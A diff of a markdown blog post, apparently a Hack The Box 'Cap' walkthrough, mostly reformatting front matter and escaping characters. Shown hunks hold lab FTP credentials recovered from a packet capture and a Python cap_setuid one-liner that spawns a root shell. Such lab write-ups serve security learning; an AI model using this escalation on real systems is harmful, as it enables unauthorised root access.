@@ -1,24 +1,26 @@
 ---
-date: 2021-10-02 16:00:00
-images: 
-- https://i.imgur.com/JkBtXmO.png
+title: 'Walktrough: HTB Cap'
 language: en-US
 localeid: htb-cap
+date: 2021-10-02T16:00:00.000Z
 tags:
-- HackTheBox
-- HTB Easy
-- HTB Linux
-- Walktrough
-title: 'Walktrough: HTB Cap'
-authors: ['default']
+  - HackTheBox
+  - HTB Easy
+  - HTB Linux
+  - Walktrough
+summary: ''
+images:
+  - 'https://i.imgur.com/JkBtXmO.png'
+authors:
+  - default
 ---
 
 Hello guys!
 
 This week's machine will be **Cap**, another easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [InfoSecJack](https://app.hackthebox.eu/users/52045).
 
-:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
-[info]
+\:information\_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
+\[info]
 
 ![HTB Cap](https://i.imgur.com/EP6oOn2.png)
 
@@ -168,7 +170,7 @@ Analyzing its content using Wireshark, started analyzing the conversation statis
 
 Analyzing each TCP Stream the most interesting one was the last (stream 3) which, in this FTP communication, we can see the credentials provided for user **nathan** and the retrieved file `notes.txt`, that could contain important information to us during this box resolution
 
-> nathan:Buck3tH4TF0RM3!
+> nathan\:Buck3tH4TF0RM3!
 
 ![HTB Cap - PCAP FTP Stream](https://i.imgur.com/DQHsTTw.png)
 
@@ -263,7 +265,7 @@ Files with capabilities (limited to 50):
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 
-The most interesting file was `/usr/bin/python3.8` that has the `cap_setuid` capability set, which, according to [python \| GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities) it can be exploited by changing the uid of the session using the command below, spanning another instance of `/bin/sh` and, from it, was able to read `root`'s flag.
+The most interesting file was `/usr/bin/python3.8` that has the `cap_setuid` capability set, which, according to [python | GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities) it can be exploited by changing the uid of the session using the command below, spanning another instance of `/bin/sh` and, from it, was able to read `root`'s flag.
 
 ```bash
 nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
@@ -275,4 +277,4 @@ cap
 
 I hope you guys have enjoyed it!
 
-See you at the next post :smile:
+See you at the next post \:smile:
